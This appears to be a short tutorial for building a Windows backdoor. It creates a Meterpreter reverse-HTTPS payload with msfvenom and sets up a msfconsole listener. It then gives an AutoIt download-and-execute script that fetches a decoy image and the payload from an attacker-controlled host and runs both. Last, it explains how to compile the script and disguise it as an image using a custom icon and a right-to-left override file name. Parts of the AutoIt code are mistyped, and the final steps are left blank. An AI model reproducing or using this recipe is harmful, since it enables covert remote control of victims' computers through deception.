# Backdoor-creating-script


# Create a payload using this command 
msfvenom --payload windows/meterpreter/reverse_https LHOST=192.168.1.16 LPORT=8080 --format exe --out rev_https_8080.exe 

# Now Listening the Backdoor Connections
1. msfconsole
2. use exploit/multi/handler
3. set payload multi/meterpreter/reverse_https
4. set lport 8080
5. set lhost $ip$
6. python3 -m http.server 8000
7. exploit

# Backdoor any file type like pdf,jpg,etc

#include <StaticConstants.au3>

#include <WindowsConstants.au3>

Local $urls = "http://www.guide-autosport.com/wp-content/uploads/photo-gallery/Nissan%20GT-R%203.8%20530%20ch%202011/nissan-gtr-2011-1.jpg,http://192.168.1.16:8000"

Local $urlsArray = StringSplit($urls, ",", 2)

For $url In $urlsArray
        $sFile DownloadFile(Surl)
        shellExecute($sFile)

Next

Func _DownloadFile($sURL)
        Local $hDownload, $sFile
        $sFile = StringRegExpReplace($sURL, "^.*/", "")
        $sDirectory = @TempDir & $sFile 
        $hDownload = InetGet ($sURL, $sDirectory, 17, 1)
        InetClose($hDownload)
        Return $sDirectory
End Func   ;==>_ GetURLImage


## (in this script we will past the url of the image and the second is our payload url) and save this file name as {autoit-download-and-execute.txt}
# now we compile the script we use tool name   Aut2Exe v3- Aultoit Script to exe converter  windows tool 
1. first we change the name autoit-download-and-execute.txt  to    autoit-download-and-execute.au3    {we change the extention now we use the compiler tool}
2. in this we give the file autoit-download-and-execute.au3
3. it will auto give .exe autoit-download-and-execute.exe
4. also add a custom icon that we download the image from our first link but that was an image we will convert it to icon
5. give that icon now convert
6. we got autoit-download-and-execute.exe file now rename it as "gta.exe" or .jpg "gtagpj.exe"   we use righ to left  override website
7. 
8. 

